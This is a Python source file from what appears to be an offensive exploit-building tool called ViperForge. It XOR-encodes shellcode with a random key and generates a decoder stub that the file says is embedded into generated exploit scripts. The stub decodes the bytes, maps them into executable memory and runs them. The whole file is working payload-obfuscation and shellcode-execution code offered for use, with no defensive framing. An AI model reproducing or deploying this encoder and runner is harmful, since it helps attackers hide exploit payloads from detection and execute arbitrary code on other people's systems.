"""
ViperForge v2.0 — XOR Encoder
Python equivalent of Go's encoder.go.
Polymorphic XOR encoder + JMP-CALL-POP decoder stub.
"""

import os
import random


def xor_encode(shellcode: bytes, key: int) -> bytes:
    """XOR encodes the given shellcode using a single byte key."""
    return bytes(b ^ key for b in shellcode)


def generate_key() -> int:
    """Generates a cryptographically secure random XOR key."""
    key = 0
    while key == 0:          # Key must not be a null byte
        key = os.urandom(1)[0]
    return key


def build_decoder_stub_python(encoded: bytes, key: int) -> str:
    """
    Generates a stub code that decodes at runtime in Python.
    Embedded into the generated exploit script.
    """
    hex_payload = ", ".join(f"0x{b:02x}" for b in encoded)
    stub = f"""\
# ── ViperForge XOR Decoder Stub ───────────────────────────────────────────────
import ctypes, mmap

_KEY   = 0x{key:02x}
_ENC   = bytearray([{hex_payload}])
_SHELL = bytes(b ^ _KEY for b in _ENC)

def _run_shellcode():
    \"\"\"Write shellcode to mmap and execute (Linux).\"\"\"
    buf = mmap.mmap(-1, len(_SHELL),
                    prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
    buf.write(_SHELL)
    buf.seek(0)
    fn  = ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(buf)))
    fn()
# ─────────────────────────────────────────────────────────────────────────────
"""
    return stub


def encode_shellcode_file(shellcode: bytes) -> tuple[bytes, int, str]:
    """
    Encodes the shellcode.
    Returns: (encoded_bytes, key, python_stub_str)
    """
    key = generate_key()
    encoded = xor_encode(shellcode, key)
    stub = build_decoder_stub_python(encoded, key)
    return encoded, key, stub
